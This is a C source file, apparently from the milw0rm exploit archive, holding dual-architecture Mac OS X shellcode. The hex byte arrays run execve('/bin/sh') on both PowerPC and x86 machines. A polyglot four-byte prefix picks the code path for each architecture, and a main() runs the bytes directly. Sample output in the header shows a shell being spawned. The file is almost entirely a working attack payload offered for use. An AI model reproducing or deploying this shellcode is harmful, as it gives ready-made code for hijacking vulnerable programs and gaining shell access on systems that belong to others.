/*
 * -[ dual.c ]-
 * by nemo@felinemenace.org
 *
 * execve("/bin/sh",{"/bin/sh",NULL},NULL) shellcode
 * for osx (both the ppc and x86 version.)
 *
 * Sample output:
 *
 * -[nemo@squee:~/shellcode]$ file dual-ppc
 * dual-ppc: Mach-O executable ppc
 * -[nemo@squee:~/shellcode]$ ./dual-ppc
 * sh-2.05b$ exit
 *
 * -[nemo@squee:~/shellcode]$ file dual-x86
 * dual-x86: Mach-O executable i386
 * -[nemo@squee:~/shellcode]$ ./dual-x86
 * sh-2.05b$ exit
 */

char dual[] =
//
// These four bytes work out to the following instruction
// in ppc arch: "rlwnm   r16,r28,r29,13,4", which will
// basically do nothing on osx/ppc.
//
// However on x86 architecture the four bytes are 3
// instructions:
//
// "push/nop/jmp"
//
// In this way, execution will be taken to the x86 shellcode
// on an x86 machine, and the ppc shellcode when running
// on a ppc architecture machine.
//
"\x5f\x90\xeb\x48"

// ppc execve() code by b-r00t
"\x7c\xa5\x2a\x79\x40\x82\xff\xfd"
"\x7d\x68\x02\xa6\x3b\xeb\x01\x70"
"\x39\x40\x01\x70\x39\x1f\xfe\xcf"
"\x7c\xa8\x29\xae\x38\x7f\xfe\xc8"
"\x90\x61\xff\xf8\x90\xa1\xff\xfc"
"\x38\x81\xff\xf8\x38\x0a\xfe\xcb"
"\x44\xff\xff\x02\x7c\xa3\x2b\x78"
"\x38\x0a\xfe\x91\x44\xff\xff\x02"
"\x2f\x62\x69\x6e\x2f\x73\x68\x58"

// osx86 execve() code by nemo
"\x31\xdb\x6a\x3b\x58\x53\xeb\x18\x5f"
"\x57\x53\x54\x54\x57\x6a\xff\x88\x5f"
"\x07\x89\x5f\xf5\x88\x5f\xfa\x9a\xff"
"\xff\xff\xff\x2b\xff\xe8\xe3\xff\xff"
"\xff/bin/shX";

int main(int ac, char **av)
{
       void (*fp)() = dual;
       fp();
}

// milw0rm.com [2005-11-13]